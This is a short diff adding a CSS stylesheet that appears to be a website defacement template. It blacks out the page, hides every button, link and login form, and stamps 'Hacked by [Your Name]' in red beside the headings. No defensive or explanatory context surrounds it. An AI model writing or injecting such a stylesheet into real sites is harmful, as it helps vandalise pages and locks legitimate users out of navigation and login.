@@ -1,0 +1,22 @@
+/* Change background color */
+body {
+  background-color: black !important;
+  color: white !important;
+}
+
+/* Hide all buttons */
+button, input[type="submit"], a {
+  display: none !important;
+}
+
+/* Hide login form */
+#login-form, .login-box {
+  display: none !important;
+}
+
+/* Add fake message */
+h1::after {
+  content: "Hacked by [Your Name]";
+  color: red;
+  font-size: 30px;
+}
